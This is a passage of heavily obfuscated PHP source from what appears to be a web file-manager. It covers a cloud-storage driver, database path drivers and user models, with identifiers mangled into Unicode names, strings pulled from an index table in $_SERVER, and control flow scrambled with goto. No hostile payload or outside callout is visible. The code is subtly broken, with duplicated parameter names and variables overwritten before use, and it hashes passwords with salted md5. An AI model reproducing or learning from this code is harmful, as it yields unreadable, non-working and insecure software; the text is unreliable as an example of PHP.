$b[8] . $this->bucket . $b[8] . $F߶ . $F); if (strpos($F, $b[225]) === 0) { $cծ[0] = $b[226]; if ($C픋 = $this->trafficLimit($b[1289])) { $F߶ = $b[1298]; array_splice($cծ, 5, 0, $F߶ . $b[4] . $C픋[$F߶]); } } if (isset($cߪ[$b[227]]) && $cߪ[$b[227]] == $b[228]) { $cծ[0] = $b[228]; } goto Bઉ; c: $F߼α = $b[1262] . $this->accessKey . $b[4] . $eǐ; if (strpos($F, $b[225]) === 0) { $F߼α = array($b[232] => $F߼α, $b[222] => $C); if ($C픋) { $F߼α = array_merge($F߼α, $C픋); } } return $F߼α; goto eƐ; a: $b =& $_SERVER[̉]; $C = isset($cߪ[$b[222]]) ? $cߪ[$b[222]] : gmdate($b[1297]); $F = isset($cߪ[$b[168]]) ? $cߪ[$b[168]] : $b[33]; goto dڐ; eƐ: } public function listUploadParts($dʟČ, $bÓ) { goto fÞ; DǼ: unset($bÓ[$fц[223]], $bÓ[$fц[227]]); $a = $this->multiUploadAuthData($dʟČ, $bÓ); if (empty($a)) { return !1; } goto aѧ; a: $C΄ = $B->getListPart(); $a = array(); foreach ($C΄ as $d¾) { $a[] = array($fц[1282] => $d¾->getPartNumber(), $fц[1283] => trim($d¾->getETag(), $fц[116])); } goto DǼ; fÞ: $fц =& $_SERVER[̉]; $fȤ = parse_url_query($bÓ[$fц[168]]); $B = $this->client->listParts($this->bucket, $this->pathEncode($dʟČ), $fȤ[$fц[221]]); goto a; aѧ: return array($fц[232] => $a, $fц[222] => $bÓ[$fц[222]], $fц[234] => $a); goto cة; cة: } public function download($F޸ҹ, $A) { if ($this->isFolder($F޸ҹ)) { return !1; } try { $Dϋ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $A); $Dϋ = $this->trafficLimit($_SERVER[̉][109], $Dϋ); $this->client->getObject($this->bucket, $this->pathEncode($F޸ҹ), $Dϋ); } catch (OSS\Core\OssException $fȌ) { return !1; } return $A; } public function fileSubstr($cɣ, $Eǈ = 0, $Cڭ = false) { if ($Eǈ === -1) { $bՐ∗ = array(); } else { if ($Cڭ === !1) { $aψ = $this->size($cɣ); } else { $aψ = $Eǈ + $Cڭ - 1; } $bՐ∗ = array(OSS\OssClient::OSS_RANGE => "{$Eǈ}\x2d{$aψ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($cɣ), $bՐ∗); } catch (OSS\Core\OssException $aڄǋ) { think_exception($aڄǋ->getMessage()); return !1; } } private function trafficLimit($FƉ, $f = array()) { goto eɞ; fϊ: if (!$dꨳҲ) { return $f; } $dꨳҲ = $dꨳҲ < 819200 ? 819200 : ($dꨳҲ > 838860800 ? 838860800 : $dꨳҲ); $f[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($dꨳҲ); goto a⦯; eɞ: $C֘ =& $_SERVER[̉]; if ($FƉ == $C֘[1289] && $this->isUploadServer() || $FƉ == $C֘[109] && $this->isFileOutServer()) { return $f; } $dꨳҲ = floatval($GLOBALS[$C֘[6]][$C֘[88]][$C֘[107]][$FƉ]) * 1024 * 1024 * 8; goto fϊ; a⦯: return $f; goto E̅; E̅: } public function link($F겜, $Fڞ = array()) { $c뱺 =& $_SERVER[̉]; if (!$this->exist($F겜) || $this->isFolder($F겜)) { return !1; } try { $Fڞ = $this->trafficLimit($c뱺[109], $Fڞ); $Bڂ = $this->client->signUrl($this->bucket, $this->pathEncode($F겜), 3600 * 12, $c뱺[228], $Fڞ); return $this->getCdnLink($Bڂ); } catch (OSS\Core\OssException $cɋƕ) { return !1; } } public function fileOut($D붘, $bܛޘ = false, $c = false, $Eޅ˛ = '') { goto d; Cɝ: $F = $this->link($D붘, $a敎); $this->fileOutLink($F); goto B酲; d: $Dܜ =& $_SERVER[̉]; if ($this->isFileOutServer()) { return $this->fileOutServer($D붘, $bܛޘ, $c, $Eޅ˛); } if (!$c) { $c = $this->pathThis($D붘); } goto b֌; fײ׫: $bܛޘ = $bܛޘ ? $Dܜ[214] : $Dܜ[215]; $a敎 = array(OSS\OssClient::OSS_SUB_RESOURCE => $Dܜ[1300] . rawurlencode("{$bܛޘ}\73\146\151\x6c\x65\x6e\x61\155\145\x3d{$c}")); $a敎[OSS\OssClient::OSS_SUB_RESOURCE] .= $Dܜ[1301] . rawurlencode($F); goto Cɝ; b֌: $c = rawurlencode($c); $F = get_file_mime(get_path_ext($c)); if ($F == $Dܜ[213]) { return parent::fileOut($D붘, $bܛޘ, $c, $Eޅ˛); } goto fײ׫; B酲: } public function fileOutServer($dӇ, $e = false, $Bګ = false, $dᬈ = '') { parent::fileOut($dӇ, $e, $Bګ, $dᬈ); } public function fileOutImage($d濔, $bǬǮ = 250) { $Eϯ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[̉][1302] . $bǬǮ); $AȌ = $this->link($d濔, $Eϯ); $this->fileOutLink($AȌ); } public function fileOutImageServer($DӠ, $d̗ = 250) { parent::fileOutImage($DӠ, $d̗); } public function fileOutLink($f) { $c膲 =& $_SERVER[̉]; if (!$this->isCdnHost() && substr($f, 0, 7) == $c膲[1203]) { $f = $c膲[1204] . substr($f, 7); } header($c膲[159] . $f); die; } public function hashMd5($D䜴ت, $D乊 = '') { $D =& $_SERVER[̉]; $c = $this->_objectMeta($D䜴ت); if (!$c) { return $D[33]; } if (!isset($c[$D[1278]]) && !empty($D乊)) { $Dřߖ = $this->updateObjMeta($D䜴ت, array($D[1278] => $D乊)); $c[$D[1278]] = $Dřߖ ? $D乊 : $D[33]; } return isset($c[$D[1278]]) ? strtolower($c[$D[1278]]) : $D[33]; } public function size($A꠩˾) { $Dע = $this->objectMeta($A꠩˾); return $Dע ? $Dע[$_SERVER[̉][78]] : 0; } public function info($Dܗ) { if ($this->isFolder($Dܗ)) { return $this->folderInfo($Dܗ); } else { if ($this->isFile($Dܗ)) { return $this->fileInfo($Dܗ); } } return !1; } public function exist($C) { return $this->isFile($C) || $this->isFolder($C); } public function isFile($f̸) { return !$this->isFolder($f̸) && $this->objectMeta($f̸); } public function isFolder($b) { return $this->cacheMethod($_SERVER[̉][199], $b); } protected function objectMeta($e۪) { return $this->cacheMethod($_SERVER[̉][200], $e۪); } protected function _objectMeta($d) { $d٭ =& $_SERVER[̉]; try { $bӄϏ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($d)); } catch (OSS\Core\OssException $cԪ) { $bӄϏ = !1; } if ($bӄϏ) { $bӄϏ[$d٭[78]] = intval($bӄϏ[$d٭[1276]]); } return $bӄϏ; } protected function _isFolder($CՇ) { $fﻂ =& $_SERVER[̉]; if ($CՇ == $fﻂ[33] || $CՇ == $fﻂ[8]) { return !0; } $EԬ࠹ = array($fﻂ[1272] => $fﻂ[8], $fﻂ[1273] => rtrim($CՇ, $fﻂ[8]) . $fﻂ[8], $fﻂ[1274] => 1, $fﻂ[1275] => $fﻂ[33]); $Cգ = $this->client->listObjects($this->bucket, $EԬ࠹); if ($Cգ->getObjectList() || $Cգ->getPrefixList()) { return !0; } return !1; } } goto C; Fͅϩ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($B𼣬) { $this->pathParse = $B𼣬; $this->model = Model($_SERVER[̉][1205]); } public function getPath($F) { return trim($F, $_SERVER[̉][8]); } public function pathFather($C) { $DΤ = $this->parse($C); $DΤ = $this->infoSimple($C); return $DΤ ? $DΤ[$_SERVER[̉][478]] : !1; } public function pathThis($Cߗ) { $C = $this->infoSimple($Cߗ); return $C ? $C[$_SERVER[̉][28]] : !1; } public function getPathOuter($aԃ) { if (!$aԃ) { return $aԃ; } $a߄އ = $this->parse($aԃ); return KodIO::make($a߄އ[$_SERVER[̉][393]]); } public function copyFolderFromIO($CԽ, $E霉, $eڢ, $dߍ, $d̃ޠ) { $c = $this->model->copyFolderFromIO($CԽ, $E霉, $eڢ, $dߍ, $d̃ޠ); return KodIO::make($c); } public function isParentOf($b, $b) { return $this->model->isParentOf($b, $b); } public function mkfile($B, $A = '', $D͛ㄙ = REPEAT_RENAME) { $E斊 =& $_SERVER[̉]; $a󵗛Ԥ = $this->parse($B); $B = $a󵗛Ԥ[$E斊[393]]; for ($D˹ = 0; $D˹ < count($a󵗛Ԥ[$E斊[1206]]); $D˹++) { $FҚ = $a󵗛Ԥ[$E斊[1206]][$D˹]; if ($D˹ == count($a󵗛Ԥ[$E斊[1206]]) - 1) { $B = $this->model->mkfile($B, $FҚ, $A, $D͛ㄙ); break; } $B = $this->model->mkdir($B, $FҚ, REPEAT_SKIP); } return $this->getPathOuter($B); } public function mkdir($e𷵝؏, $DЌά = REPEAT_SKIP) { $C狸 =& $_SERVER[̉]; $c = $this->parse($e𷵝؏); $e𷵝؏ = $c[$C狸[393]]; for ($Cݥ = 0; $Cݥ < count($c[$C狸[1206]]); $Cݥ++) { $Eꩊ = $c[$C狸[1206]][$Cݥ]; $e𷵝؏ = $this->model->mkdir($e𷵝؏, $Eꩊ, $DЌά); } return $this->getPathOuter($e𷵝؏); } public function copyFile($aڊ, $f, $eĢ = REPEAT_REPLACE) { $D렎 =& $_SERVER[̉]; $EӲ = $this->parse($f); $C̖ = $this->model->copy($aڊ, $EӲ[$D렎[393]], $eĢ, $EӲ[$D렎[76]]); return $C̖ ? $this->getPathOuter($C̖) : !1; } public function moveFile($f烚, $B, $d = REPEAT_REPLACE) { $A =& $_SERVER[̉]; $AЙ = $this->parse($B); $a = $this->model->move($f烚, $AЙ[$A[393]], $d, $AЙ[$A[76]]); return $a ? $this->getPathOuter($a) : !1; } public function copy($Cǹ, $Fթ, $cҿ = REPEAT_REPLACE) { $cऻ = $this->parse($Fթ); $dӳ = $this->model->copy($Cǹ, $cऻ[$_SERVER[̉][393]], $cҿ); return $dӳ ? $this->getPathOuter($dӳ) : !1; } public function moveSameAllow() { } public function move($b̩, $a襙, $Ḋ = REPEAT_REPLACE) { $fҚ = $this->parse($a襙); $C = $this->model->move($b̩, $fҚ[$_SERVER[̉][393]], $Ḋ); return $C ? $this->getPathOuter($C) : !1; } public function remove($f, $DӌǴ = true) { return $this->model->remove($f, $DӌǴ); } public function rename($dܯ, $b) { $cŐÎ = $this->model->rename($dܯ, $b); return $cŐÎ ? $this->getPathOuter($dܯ) : $cŐÎ; } public function size($e) { $Bʔ = $this->infoSimple($e); return $Bʔ ? $Bʔ[$_SERVER[̉][78]] : 0; } public function infoSimple($e) { return $this->model->sourceInfo($e); } public function info($bİ) { return $this->infoParse($bİ); } public function infoAuth($C) { return $this->infoParse($C, !1, !0); } public function infoWithChildren($aĹ) { return $this->infoParse($aĹ, !0); } protected function infoParse($D, $aܠ = false, $d = false) { if (!$aܠ) { return $this->model->pathInfo($D, $d); } return $this->model->pathInfoMore($D); } public function infoFull($e茑ꛇ) { $aڝٜ =& $_SERVER[̉]; $Aĩ̵ = explode($aڝٜ[8], $e茑ꛇ); $eⅉֹ = implode($aڝٜ[8], array_splice($Aĩ̵, 1)); return $this->model->pathInfoByPath($Aĩ̵[0], $eⅉֹ); } public function hashSimple($aԊ) { $a =& $_SERVER[̉]; $Bé̴ = $this->infoWithChildren($aԊ); return $Bé̴[$a[164]][$a[171]]; } public function hashMd5($aˈ) { $Dôܷ =& $_SERVER[̉]; $a = $this->infoWithChildren($aˈ); return $a[$Dôܷ[164]][$Dôܷ[170]]; } public function exist($dӃ) { $CΈ˕ =& $_SERVER[̉]; $dт = $this->parse($dӃ); if (!$dт[$CΈ˕[76]]) { return $this->isFile($dӃ) || $this->isFolder($dӃ); } $Fƕ = array($CΈ˕[394] => $dт[$CΈ˕[393]], $CΈ˕[28] => $dт[$CΈ˕[76]]); $B = $this->model->where($Fƕ)->find(); return $B ? !0 : !1; } public function isFile($f֥) { $cİ =& $_SERVER[̉]; $D旛 = $this->infoSimple($f֥); return $D旛 && $D旛[$cİ[403]] == $cİ[87] ? !1 : !0; } public function isFolder($e) { $B =& $_SERVER[̉]; $Fʊ = $this->infoSimple($e); return $Fʊ && $Fʊ[$B[403]] == $B[87] ? !0 : !1; } public function listPath($c刳, $Dϑн = false) { $D =& $_SERVER[̉]; if ($c刳 == $D[33]) { return !1; } $B䡡 = array($D[394] => $c刳); if ($Dϑн) { return $this->model->listSource($B䡡, -1); } return $this->model->listSource($B䡡); } public function has($Cŷ, $cÛ = false, $C士 = null) { $e挈 =& $_SERVER[̉]; $cގ = $this->infoWithChildren($Cŷ); if ($cÛ) { return array($e挈[204] => $cގ[$e挈[204]], $e挈[203] => $cގ[$e挈[203]]); } return $C士 ? $cގ[$e挈[204]] : $cގ[$e挈[203]]; } public function listAll($aӿږ) { $E = IO::info($this->pathParse[$_SERVER[̉][76]]); if (!$E) { return array(); } return $this->model->listAll($aӿږ); } public function getContent($Aۗ) { return $this->model->getContent($Aۗ); } public function setContent($fߜ׌, $cɓ = '') { return $this->model->setContent($fߜ׌, $cɓ); } public function fileSubstr($B, $f܄, $Bݸ) { return $this->model->fileSubstr($B, $f܄, $Bݸ); } public function download($bқۋ, $C = '') { $Dϧ = get_path_father($C); $Cȃ = get_path_this($C); $aЂ = $this->model->fileInfoGet($bқۋ); $aҮۄ = IO::copy($aЂ[$_SERVER[̉][76]], $Dϧ, !1, $Cȃ); return $aҮۄ; } public function setModifyTime($eΤ, $aעӐ = '') { $eΉد =& $_SERVER[̉]; if (!$eΤ) { return; } $this->model->where(array($eΉد[410] => $eΤ))->save(array($eΉد[84] => $aעӐ)); } public function upload($Fَ婊, $f, $C = false, $Bɋ֏ = REPEAT_REPLACE) { $b䆵 =& $_SERVER[̉]; $e㯕 = $this->parse($Fَ婊); $fѡ = $this->model->addFile($e㯕[$b䆵[393]], $f, $e㯕[$b䆵[76]], $C, $Bɋ֏); return $this->getPathOuter($fѡ); } public function uploadFileByID($A鐨, $F, $aɎ) { $a =& $_SERVER[̉]; $CѤ = $this->parse($A鐨); $Eܴ = $this->model->addFileByFileID($CѤ[$a[393]], $F, $CѤ[$a[76]], $aɎ); return $this->getPathOuter($Eܴ); } public function addFileByRemote($Cݠ, $A㠸, $eň߼ = array(), $dҠ = '', $A֏) { $B왳µ =& $_SERVER[̉]; $Aø = $this->parse($Cݠ); $dҠ = empty($dҠ) ? $Aø[$B왳µ[76]] : $dҠ; $F = $this->model->addFileByRemote($Aø[$B왳µ[393]], $A㠸, $dҠ, $eň߼, $A֏); return $this->getPathOuter($F); } public function uploadLink($Dԛ, $e = 0) { $d̃ϢԵ =& $_SERVER[̉]; $CȽï = $this->parse($Dԛ); $B݋̅ = _get($GLOBALS[$d̃ϢԵ[7]], $d̃ϢԵ[1207]); $aϯõ = _get($GLOBALS[$d̃ϢԵ[7]], $d̃ϢԵ[1208]); $Dԛ = Model($d̃ϢԵ[571])->createFileName($CȽï[$d̃ϢԵ[76]], $B݋̅, $aϯõ); return IO::uploadLink($Dԛ, $e); } public function fileNameAuto($aߏ뱯, $c˛, $bѹǐ = REPEAT_REPLACE, $Fԃ = false) { return $this->model->fileNameAuto($aߏ뱯, $c˛, $bѹǐ, $Fԃ); } public function fileNameExist($D, $Dڬ) { return $this->model->fileNameExist($D, $Dڬ); } protected function _fileOut($f, $AԔ = false, $dʼ = false, $f = '', $d˱ = false) { goto A·ʷ; A·ʷ: $f =& $_SERVER[̉]; $DΆ = $this->model->sourceInfo($f); if ($DΆ[$f[403]] == $f[87]) { header($f[1209]); die; } goto Cɣì; Cɣì: $Aǟ = $this->model->fileInfoGet($f); $f = $Aǟ[$f[170]] ? $Aǟ[$f[170]] : $f; $Cί = isset($GLOBALS[$f[1210]]) ? $GLOBALS[$f[1210]] : $DΆ[$f[28]]; goto e; e: if ($d˱) { return IO::fileOutServer($Aǟ[$f[76]], $AԔ, $Cί, $f); } IO::fileOut($Aǟ[$f[76]], $AԔ, $Cί, $f); goto a; a: } public function fileOut($D, $A = false, $A秦 = false, $Cߡ = '') { $this->_fileOut($D, $A, $A秦, $Cߡ); } public function fileOutServer($D, $Fҟ = false, $bǠ = false, $cִᔰ = '') { $this->_fileOut($D, $Fҟ, $bǠ, $cִᔰ, !0); } protected function _fileOutImage($bח, $f׸ = 250) { goto B; A뛄: $Eԏ = $this->model->fileInfoGet($bח); $Eԏ[$aؾ[28]] = $c[$aؾ[28]]; $Eԏ[$aؾ[163]] = $c[$aؾ[163]]; goto c; c: $GLOBALS[$aؾ[1210]] = $Eԏ[$aؾ[28]]; $GLOBALS[$aؾ[162]] = $Eԏ; IO::fileOutImage($Eԏ[$aؾ[76]], $f׸); goto F֨; B: $aؾ =& $_SERVER[̉]; $c = $this->model->pathInfo($bח); if ($c[$aؾ[403]] == $aؾ[87]) { show_json($aؾ[1211] . $bח, !1); } goto A뛄; F֨: } public function fileOutImage($eƹ, $Bʊ޷ = 250) { $this->_fileOutImage($eƹ, $Bʊ޷); } public function fileOutImageServer($dƓ, $cܖ݅ = 250) { $this->_fileOutImage($dƓ, $cܖ݅); } public function link($Aé, $A߄ޑ = '') { $Eձɍ = $this->model->fileInfoGet($Aé); return IO::link($Eձɍ[$_SERVER[̉][76]], $A߄ޑ); } protected function parse($Eʹ귿) { $fޓ =& $_SERVER[̉]; if (strstr($Eʹ귿, $fޓ[8]) === !1) { return array($fޓ[412] => intval($Eʹ귿), $fޓ[76] => $fޓ[33], $fޓ[1206] => array()); } $C = explode($fޓ[8], trim($Eʹ귿, $fޓ[8])); if (count($C) < 2) { show_tips($Eʹ귿 . $fޓ[1212]); } return array($fޓ[412] => intval($C[0]), $fޓ[76] => $C[1], $fޓ[1206] => array_slice($C, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($D) { $this->pathParse = $D; $this->model = Model($_SERVER[̉][1205]); } public function getPathOuter($A) { $Aˬ =& $_SERVER[̉]; if (!$A) { return $A; } $aҠ = $this->parse($A); return trim(KodIO::makeShare($this->pathParse[$Aˬ[393]], $aҠ[$Aˬ[393]]), $Aˬ[8]); } protected function infoParse($eӜ, $Bַ = false, $a׺՝ = false) { $eԷ =& $_SERVER[̉]; $Eɑ = $this->pathParse[$eԷ[393]]; $d˙亍 = trim($this->pathParse[$eԷ[1063]], $eԷ[8]); return Action($eԷ[1213])->sharePathInfo($Eɑ, $d˙亍); } public function infoFull($a­) { $Dظ =& $_SERVER[̉]; $C = explode($Dظ[8], trim($a­, $Dظ[8])); if (count($C) > 1) { $Aݠ = implode($Dظ[8], array_splice($C, 1)); $A׊ = $this->model->pathInfoByPath($C[0], $Aݠ); if (!$A׊) { return !1; } $this->pathParse[$Dظ[1063]] = $A׊[$Dظ[395]]; } return $this->infoParse($a­); } public function listAll($Dט) { goto eݵڈ; c֏˾: foreach ($Dʼב as &$f) { check_abort(); $f[$FȖť[85]] = $d->_shareItemeParse($f[$FȖť[85]], $Cﮑ); } unset($f); return $Dʼב; goto Dץ; eݵڈ: $FȖť =& $_SERVER[̉]; $B亂 = IO::info($this->pathParse[$FȖť[76]]); if (!$B亂) { return array(); } goto fď; fď: $Dʼב = $this->model->listAll($Dט); $Cﮑ = Model($FȖť[563])->getInfo($B亂[$FȖť[468]]); $d = Action($FȖť[1213]); goto c֏˾; Dץ: } } $Fٶ = $_SERVER[$_SERVER[̉][835]]; goto a; D: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\152\x6f\x62\114\151\163\x74"; public $field = array("\156\141\155\x65", "\x64\145\x73\143", "\x73\x6f\x72\x74"); const JOB_KEY = "\x73\145\154\x66\112\x6f\x62\114\151\163\164"; public function listData($a = false, $a = "\163\157\x72\x74", $aۮ = false) { return parent::listData($a, $a, $aۮ); } public function remove($Cߊړ) { return parent::remove($Cߊړ); } public function add($eݯ쵄) { $EǸ =& $_SERVER[̉]; if ($this->findByName($eݯ쵄[$EǸ[28]])) { return !1; } $eݯ쵄[$EǸ[1718]] = $this->getSort(); return parent::insert($eݯ쵄); } private function getSort() { $b =& $_SERVER[̉]; $a؞ꢫ = parent::listData(); $f = array_to_keyvalue($a؞ꢫ, $b[33], $b[1718]); return empty($f) ? 0 : max($f) + 1; } public function update($Bɳ, $C፩) { $cĴ =& $_SERVER[̉]; $D靂 = parent::listData($Bɳ); $d = $this->findByName($C፩[$cĴ[28]]); if (!$D靂 || $d && $d[$cĴ[393]] != $D靂[$cĴ[393]]) { return !1; } return parent::update($Bɳ, $C፩); } public function setUserJob($aς, $DȎ) { goto c˅ٮ; c˅ٮ: $eυϢ =& $_SERVER[̉]; if (!is_array($DȎ)) { $DȎ = array($DȎ); } $b꫕ = parent::listData(); goto d; d: $Aꔅ = array_to_keyvalue($b꫕, $eυϢ[28]); $B뼤 = $eυϢ[375]; foreach ($DȎ as $Dꚯ) { if ($Aꔅ[$Dꚯ]) { $B뼤 .= $Aꔅ[$Dꚯ][$eυϢ[393]] . $eυϢ[47]; } else { $bɈ = $this->add($Dꚯ); $B뼤 .= $bɈ . $eυϢ[47]; } } goto e; e: $B뼤 = rtrim($B뼤, $eυϢ[47]); Model($eυϢ[506])->metaSet($aς, self::JOB_KEY, $B뼤); goto Dۢ; Dۢ: } public function getUserJob($F) { $f݃ = Model($_SERVER[̉][506])->metaGet($F); return $this->getUserJobInfo($f݃[self::JOB_KEY]); } public function getUserJobInfo($AȈ) { goto b򤬃; b򤬃: $dА =& $_SERVER[̉]; $c = explode($dА[47], $AȈ); $c = parent::listData(); goto Fӌ; cԐ: return $A; goto A; Fӌ: $c = array_remove_key($c, $dА[194]); $A = array(); foreach ($c as $Fǅ) { if (isset($c[$Fǅ])) { $A[] = $c[$Fǅ]; } } goto cԐ; A: } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\162"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\x61\155\145" => "\165\x73\x65\162\137\x6d\x65\164\141", "\x6d\145\x74\x61\106\x69\145\x6c\144" => "\165\x73\x65\162\111\104"); protected $simpleField = "\x75\163\145\x72\111\x44\x2c\156\x69\143\x6b\116\141\x6d\x65\x2c\x6e\141\x6d\x65\x2c\141\166\141\164\x61\x72\x2c\163\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($eʦ) { $C =& $_SERVER[̉]; $aǴ = $C[2119]; return array($C[1765] => array($eʦ[0], $aǴ), $C[1767] => array($eʦ[0], $aǴ), $C[2120] => array($eʦ[0], $aǴ)); } protected function getInfo($d׍, $Aڇֽ = false) { $CƗ = $this->getInfoSimple($d׍); if (!is_array($CƗ)) { return array(); } if ($Aڇֽ) { return $this->_getInfoApply($CƗ); } return $this->cacheFunctionGet($_SERVER[̉][1774], $d׍); } protected function getInfoFull($fޕ, $F = false) { $dә = $this->getInfoSimple($fޕ); if (!is_array($dә)) { return array(); } if ($F) { return $this->_getInfoApply($dә, !0); return $this->_getInfoApply($dә, !0); } return $this->cacheFunctionGet($_SERVER[̉][2121], $fޕ); } private function _getInfoApply($BݙŶ, $a = false) { goto E; Bņч: $BݙŶ = $this->_listDataApplyItem($BݙŶ); $E = Model($dؽ[1205])->metaGet($BݙŶ[$dؽ[85]][$dؽ[395]]); $BݙŶ[$dؽ[2124]] = $bܻ; goto C; E: $dؽ =& $_SERVER[̉]; if (!$BݙŶ) { return $BݙŶ; } $bܻ = md5($dؽ[2122] . $BݙŶ[$dؽ[848]] . $dؽ[2123] . $BݙŶ[$dؽ[28]]); goto Bņч; C: $BݙŶ[$dؽ[85]][$dؽ[1955]] = isset($E[$dؽ[1956]]) ? $E[$dؽ[1956]] : null; if ($a) { $BݙŶ[$dؽ[445]] = $this->metaGet($BݙŶ[$dؽ[1531]]); } return $BݙŶ; goto cд; cд: } protected function getInfoSimple($Fߟ, $DὉă = false) { $DӃ =& $_SERVER[̉]; if (!$Fߟ) { return array(); } if ($DὉă) { $f = $this->where(array($DӃ[1531] => intval($Fߟ)))->find(); if (!is_array($f)) { return array(); } $f[$DӃ[2125]] = Action($DӃ[2126])->parseUrl($f[$DӃ[2125]]); return $f; } return $this->cacheFunctionGet($DӃ[1768], $Fߟ); } protected function getInfoSimpleOuter($B覼) { goto a; e: return $a皐; goto C֏; a煬: $a皐 = array_field_key($e, explode($c¾[47], $this->simpleField)); if (!$a皐) { return array($c¾[1531] => $c¾[1084], $c¾[28] => $c¾[160] . LNG($c¾[2129]) . $c¾[504], $c¾[2125] => STATIC_PATH . $c¾[2130]); } $a皐[$c¾[2125]] = Action($c¾[2126])->parseUrl($a皐[$c¾[2125]]); goto e; a: $c¾ =& $_SERVER[̉]; if (!$B覼 || $B覼 == 0) { return array($c¾[1531] => $c¾[191], $c¾[28] => $c¾[160] . LNG($c¾[2127]) . $c¾[504], $c¾[2125] => STATIC_PATH . $c¾[2128]); } $e = $this->cacheFunctionGet($c¾[1768], $B覼); goto a煬; C֏: } protected function groupUser($Dژʦ) { } public static function errorLang($Dޭ) { $A͟ =& $_SERVER[̉]; $aݑ꒫ = array(self::ERROR_USER_NOT_EXISTS => $A͟[2131], self::ERROR_USER_PASSWORD_ERROR => $A͟[2132], self::ERROR_USER_EXIST_NAME => $A͟[2133], self::ERROR_USER_EXIST_PHONE => $A͟[2134], self::ERROR_USER_EXIST_EMAIL => $A͟[2135], self::ERROR_USER_LOGIN_LOCK => $A͟[2136], self::ERROR_IP_NOT_ALLOW => $A͟[2137], self::ERROR_USER_EXIST_NICKNAME => $A͟[2138]); return LNG($aݑ꒫[$Dޭ]); } public function getInfoByMeta($d, $F組ŏ) { $Dёው =& $_SERVER[̉]; $A = Model($Dёው[2139])->where(array($Dёው[93] => $d, $Dёው[372] => $F組ŏ))->find(); if ($A) { return $this->getInfo($A[$Dёው[1531]]); } return !1; } public function userLoginCheck($Eد, $c켠) { $A =& $_SERVER[̉]; $Dο = $this->userLoginFind($Eد); if (!$Dο) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Dο[$A[1531]], $c켠)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Dο[$A[1531]]); } public function userLoginFind($bȏ) { $D՜Ӷ =& $_SERVER[̉]; $a۫ϐ = array($D՜Ӷ[28] => $bȏ, $D՜Ӷ[1959] => $bȏ, $D՜Ӷ[303] => $bȏ, $D՜Ӷ[2140] => $bȏ, $D՜Ӷ[956] => $D՜Ӷ[958]); if ($this->nickNameRpt()) { unset($a۫ϐ[$D՜Ӷ[1959]]); } return $this->where($a۫ϐ)->find(); } public function clearCache($Cׄ) { $Fڷ =& $_SERVER[̉]; $this->cacheFunctionClear($Fڷ[1774], $Cׄ); $this->cacheFunctionClear($Fڷ[1768], $Cׄ); $this->cacheFunctionClear($Fڷ[2121], $Cׄ); } public function userPasswordCheck($f, $Eɴ) { $A =& $_SERVER[̉]; $AƬ؎ = $this->where(array($A[1531] => intval($f)))->find(); $Fà = $this->metaGet($f); $F̏ = isset($Fà[$A[2141]]) ? $Fà[$A[2141]] : $A[33]; if (md5($F̏ . trim($Eɴ)) !== $AƬ؎[$A[848]]) { return !1; } return !0; } public function userAdd($A󉊺ἇ) { goto B; B: $f =& $_SERVER[̉]; $bĚ = array($f[413] => $A󉊺ἇ[$f[28]], $f[2142] => $A󉊺ἇ[$f[1414]], $f[2143] => isset($A󉊺ἇ[$f[303]]) ? $A󉊺ἇ[$f[303]] : $f[33], $f[2144] => isset($A󉊺ἇ[$f[2140]]) ? $A󉊺ἇ[$f[2140]] : $f[33], $f[2145] => isset($A󉊺ἇ[$f[1959]]) ? $A󉊺ἇ[$f[1959]] : $A󉊺ἇ[$f[28]], $f[2146] => isset($A󉊺ἇ[$f[2125]]) ? $A󉊺ἇ[$f[2125]] : $f[33], $f[2147] => isset($A󉊺ἇ[$f[2148]]) ? $A󉊺ἇ[$f[2148]] : 1, $f[2149] => $A󉊺ἇ[$f[848]], $f[1769] => isset($A󉊺ἇ[$f[1679]]) ? $A󉊺ἇ[$f[1679]] : 1024 * 1024 * 20, $f[1770] => 0, $f[2150] => 0, $f[1813] => isset($A󉊺ἇ[$f[713]]) ? $A󉊺ἇ[$f[713]] : 1); if (!empty($A󉊺ἇ[$f[1531]])) { $bĚ[$f[1531]] = $A󉊺ἇ[$f[1531]]; } goto aϊ髢; d􋱊: return $Dˉ; goto e̟; cɔ: $Eأ = array($f[2149] => $bĚ[$f[848]], $f[2145] => $bĚ[$f[1959]]); $this->userEdit($Dˉ, $Eأ); Model($f[1205])->userRootAdd($Dˉ); goto d􋱊; aϊ髢: $C𙗓ƃ = $this->_checkExist($A󉊺ἇ); if ($C𙗓ƃ !== !0) { return $C𙗓ƃ; } $Dˉ = $this->add($bĚ); goto cɔ; e̟: } protected function userEditTest($D, $Cѭ) { return $this->call($_SERVER[̉][2151], $D, $Cѭ); } protected function userEdit($Aܔ, $f喙ɹ) { goto CϿ; CϿ: $C =& $_SERVER[̉]; $fאཕ = $this->getInfoSimple($Aܔ); if (!$fאཕ) { return !1; } goto B; e£: return !0; goto Bݻ; FאƋ: $this->where(array($C[1523] => $Aܔ))->save($f喙ɹ); if (isset($f喙ɹ[$C[1959]])) { $this->setNamePinyin($Aܔ, $f喙ɹ[$C[1959]]); } $this->clearCache($Aܔ); goto e£; B: $b׬ = $this->_checkExist($f喙ɹ, $Aܔ); if ($b׬ !== !0) { return $b׬; } if (isset($f喙ɹ[$C[848]]) && trim($f喙ɹ[$C[848]]) != $C[33]) { $a = $this->metaGet($Aܔ); if (empty($a[$C[2141]])) { $a[$C[2141]] = rand_string(10); Model($C[502])->metaSet($Aܔ, $C[2141], $a[$C[2141]]); } $f喙ɹ[$C[848]] = md5($a[$C[2141]] . 